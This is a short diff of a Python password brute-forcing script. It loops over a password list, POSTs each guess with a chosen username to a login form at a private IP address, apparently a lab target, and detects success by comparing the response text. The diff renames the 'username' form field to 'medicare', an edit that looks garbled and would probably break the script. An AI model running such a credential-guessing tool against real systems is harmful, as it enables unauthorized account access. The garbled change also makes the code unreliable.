@@ -16,7 +16,7 @@ user = input("Username to crack: ")
 for line in pass_file:
     pw = line.rstrip()
     r = requests.post("http://10.66.28.202:8230/login", data={
-        "username": user,
+        "medicare": user,
         "password": pw
     })
     if r.text != "Username/password doesn't match homie. <a href='javascript:history.back()''>Go back</a>":
